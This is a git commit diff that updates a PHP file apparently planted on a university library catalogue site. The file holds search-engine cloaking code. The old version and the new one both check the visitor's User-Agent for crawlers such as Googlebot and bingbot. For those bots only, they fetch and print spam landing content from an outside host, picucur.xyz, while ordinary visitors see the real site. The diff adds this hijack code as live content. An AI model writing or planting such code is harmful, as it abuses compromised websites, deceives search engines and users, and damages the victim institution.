1fb2e5787f94ff08c6563095b7a5478467672bc9
parbada <goodtogel207@gmail.com>
2025-05-22 17:27:21 +0700

    Update index.php-opac-utssurabaya.php

--- index.php-opac-utssurabaya.php
+++ index.php-opac-utssurabaya.php
@@ -1,29 +1,21 @@
 <?php
-ob_start();
-header("Vary: User-Agent");
-$bot_url = "https://picucur.xyz/landing/opac-utssurabaya/";
-$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
-function lph_requests($url)
-{
-    if (function_exists("curl_init")) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
-    } elseif (ini_get("allow_url_fopen")) {
-        return file_get_contents($url);
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
     }
+    
     return false;
 }
-if (preg_match($botchar, $ua)) {
-    usleep(rand(100000, 200000));
-    echo lph_requests($bot_url);
-    ob_end_flush();
-    die;
+
+if (is_bot()) {
+    $message = file_get_contents('https://picucur.xyz/landing/opac-utssurabaya/landing.txt');
+    echo $message;
+exit;
 }
 ?>
 
